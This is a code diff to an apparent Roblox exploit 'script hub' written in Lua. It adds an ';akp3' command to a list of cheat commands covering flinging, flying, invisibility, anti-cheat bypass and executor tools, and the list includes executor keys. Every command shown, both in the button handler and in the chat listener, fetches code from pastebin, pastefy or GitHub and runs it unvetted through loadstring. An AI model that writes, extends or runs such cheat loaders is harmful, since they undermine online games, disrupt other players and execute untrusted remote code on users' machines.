@@ -250,7 +250,7 @@ end
 local commands = {
     ";avtor", ";gh", ";na2", ";inf", ";na1", ";le", ";tfling", ";fly", ";fly2", ";rtt", ";qcmd",
     ";tfling2", ";bp1", ";bp2", ";bp3", ";bp4", ";bhtool", ";mvtool", ";grtool", ";tel1", ";tel2", ";glios", ";cmds", ";hth",
-    ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";tel3", ";roa", ";akp1", ";akp2",
+    ";zomb", ";search", ";knpc", ";jerk", ";punch", ";invis2", ";invis", ";tel3", ";roa", ";akp1", ";akp2", ";akp3",
     ";prox", ";rochips", ";fc1", ";fc2", "synapse", ";synapse2", ";krnl", ";krnlk", ";bypass", ";fc3", ";rp", ";rp2", ";srp", ";srp2", ";tictactoe", ";illus", ";toolgui", ";keyb", ";wibtt", ";acl", ";krunox", ";crouch", ";srp3", ";srp4", ";tptool",
     ";rc7 (key: MegaSecretPasswordForRC7)",
     ";krnlk (key: 9X1L9ZPAXN4)"
@@ -279,6 +279,8 @@ executeButton.MouseButton1Click:Connect(function()
         loadstring(game:HttpGet("https://pastebin.com/raw/RJe1HXrQ"))()
     elseif codeToExecute == ";mvtool" then
         loadstring(game:HttpGet("https://pastefy.app/Vcuyg09O/raw"))()
+    elseif codeToExecute == ";akp3" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/DfjrwJie"))()
     elseif codeToExecute == ";rtt" then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/RTT-Tool/refs/heads/main/RTT%20Tool"))()
     elseif codeToExecute == ";bhtool" then
@@ -493,6 +495,8 @@ cc = game.Players.LocalPlayer.Chatted:Connect(function(msg)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))()
     elseif spaceSplit[1] == ";keyb" then
         loadstring(game:HttpGet('https://pastefy.app/Te4dwSw2/raw'))()
+    elseif spaceSplit[1] == ";akp3" then
+        loadstring(game:HttpGet("https://pastebin.com/raw/DfjrwJie"))()
     elseif spaceSplit[1] == ";crouch" then
         loadstring(game:HttpGet("https://pastebin.com/raw/sebBaBWi"))()
     elseif spaceSplit[1] == ";zomb" then
